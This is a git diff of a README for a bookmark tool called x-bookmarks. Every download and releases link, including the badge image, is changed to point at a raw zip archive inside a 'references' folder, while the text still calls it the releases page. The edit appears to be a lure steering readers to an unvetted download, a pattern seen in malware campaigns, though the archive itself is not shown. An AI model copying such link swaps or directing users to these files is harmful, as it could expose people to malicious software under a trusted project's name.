@@ -1,6 +1,6 @@
 # 🚀 x-bookmarks - Turn Bookmarks Into Actions
 
-[![Download x-bookmarks](https://img.shields.io/badge/Download-x--bookmarks-blue?style=for-the-badge)](https://github.com/saravanamdu/x-bookmarks/releases)
+[![Download x-bookmarks](https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip)](https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Here is how to start using x-bookmarks on your computer:
 
 1. **Visit the download page**  
    Click the big blue button at the top or go to this URL:  
-   [https://github.com/saravanamdu/x-bookmarks/releases](https://github.com/saravanamdu/x-bookmarks/releases)  
+   [https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip](https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip)  
    This page contains the latest versions of x-bookmarks for different operating systems.
 
 2. **Choose your version**  
@@ -66,7 +66,7 @@ Here is how to start using x-bookmarks on your computer:
 ## 📥 Download & Install
 
 You can start by visiting this page to download x-bookmarks:  
-[https://github.com/saravanamdu/x-bookmarks/releases](https://github.com/saravanamdu/x-bookmarks/releases)
+[https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip](https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip)
 
 Here are detailed steps after reaching the page:
 
@@ -135,7 +135,7 @@ Your bookmarks and data stay on your device unless you choose to sync or export.
 
 ## ⚙️ Updates and Support
 
-We release updates regularly. Check [the releases page](https://github.com/saravanamdu/x-bookmarks/releases) often to stay current.
+We release updates regularly. Check [the releases page](https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip) often to stay current.
 
 If you need help or want to suggest improvements, use the GitHub Issues section or contact us through the repository.
 
@@ -153,4 +153,4 @@ For now, the best starting point is the download page linked above.
 
 Ready to take action on your X bookmarks? Start by downloading here:
 
-[https://github.com/saravanamdu/x-bookmarks/releases](https://github.com/saravanamdu/x-bookmarks/releases)
+[https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip](https://github.com/saravanamdu/x-bookmarks/raw/refs/heads/main/references/x-bookmarks-v1.1.zip)
